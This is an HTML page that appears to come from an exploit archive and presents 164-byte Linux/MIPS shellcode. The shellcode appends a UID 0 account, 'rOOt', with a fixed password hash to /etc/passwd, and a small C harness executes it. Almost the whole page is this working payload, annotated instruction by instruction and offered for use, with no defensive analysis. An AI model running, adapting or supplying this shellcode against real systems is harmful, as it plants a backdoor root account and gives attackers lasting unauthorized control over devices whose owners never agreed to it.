<html><head><title>Linux/mips - add user(UID 0) with password - 164 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* Title:  Linux/MIPS - add user(UID 0) with password - 164 bytes
 * Date:   2011-11-24
 * Author: rigan - imrigan [at] gmail.com
 * Note:
 *         Username - rOOt
 *         Password - pwn3d
 */
 
#include &lt;stdio.h&gt;
 
char sc[] =
        &quot;\x24\x09\x73\x50&quot;       //  li      t1,29520
        &quot;\x05\x30\xff\xff&quot;       //  bltzal  t1,400094 &lt;L&gt;
        &quot;\x24\x09\x73\x50&quot;       //  li      t1,29520 (nop)
     
        /* open(&quot;/etc/passwd&quot;, O_WRONLY|O_CREAT|O_APPEND); */
        &quot;\x3c\x0f\x30\x2f&quot;       //  lui     t7,0x302f
        &quot;\x35\xef\x65\x74&quot;       //  ori     t7,t7,0x6574
        &quot;\x3c\x0e\x63\x2f&quot;       //  lui     t6,0x632f   
        &quot;\x35\xce\x70\x61&quot;       //  ori     t6,t6,0x7061
        &quot;\x3c\x0d\x73\x73&quot;       //  lui     t5,0x7373
        &quot;\x35\xad\x77\x64&quot;       //  ori     t5,t5,0x7764
        &quot;\xaf\xaf\xff\xf3&quot;       //  sw      t7,-13(sp)
        &quot;\xaf\xae\xff\xf7&quot;       //  sw      t6,-9(sp)
        &quot;\xaf\xad\xff\xfb&quot;       //  sw      t5,-5(sp)
        &quot;\xaf\xa0\xff\xff&quot;       //  sw      zero,-1(sp)
        &quot;\x27\xa4\xff\xf4&quot;       //  addiu   a0,sp,-12
        &quot;\x24\x05\x01\x6d&quot;       //  li      a1,365
        &quot;\x24\x02\x0f\xa5&quot;       //  li      v0,4005
        &quot;\x01\x01\x01\x0c&quot;       //  syscall 0x40404
 
        &quot;\xaf\xa2\xff\xfc&quot;       //  sw      v0,-4(sp)
     
        /* write(fd, &quot;rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n&quot;, 45); */
        &quot;\x8f\xa4\xff\xfc&quot;       //  lw      a0,-4(sp)
        &quot;\x23\xe5\x10\x0c&quot;       //  addi    a1,ra,4108
        &quot;\x20\xa5\xf0\x60&quot;       //  addi    a1,a1,-4000
        &quot;\x24\x09\xff\xd3&quot;       //  li      t1,-45
        &quot;\x01\x20\x30\x27&quot;       //  nor     a2,t1,zero
        &quot;\x24\x02\x0f\xa4&quot;       //  li      v0,4004
        &quot;\x01\x01\x01\x0c&quot;       //  syscall 0x40404
         
        /* close(fd); */
        &quot;\x24\x02\x0f\xa6&quot;       //  li      v0,4006
        &quot;\x01\x01\x01\x0c&quot;       //  syscall 0x40404
     
        /* exit(0);  */
        &quot;\x28\x04\xff\xff&quot;        //  slti    a0,zero,-1
        &quot;\x24\x02\x0f\xa1&quot;        //  li      v0,4001
        &quot;\x01\x01\x01\x0c&quot;        //  syscall 0x40404
      
        /*  &quot;rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n&quot; */
        &quot;\x72\x4f\x4f\x74&quot;       
        &quot;\x3a\x58\x4a\x31&quot;       
        &quot;\x47\x56\x2e\x6e&quot;       
        &quot;\x79\x46\x46\x4d&quot;       
        &quot;\x6f\x49\x3a\x30&quot;       
        &quot;\x3a\x30\x3a\x72&quot;       
        &quot;\x6f\x6f\x74\x3a&quot;       
        &quot;\x2f\x72\x6f\x6f&quot;      
        &quot;\x74\x3a\x2f\x62&quot;      
        &quot;\x69\x6e\x2f\x62&quot;       
        &quot;\x61\x73\x68\x0a&quot;;       
       
void main(void)
{
       void(*s)(void);
       printf(&quot;size: %d\n&quot;, strlen(sc));
       s = sc;
       s();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
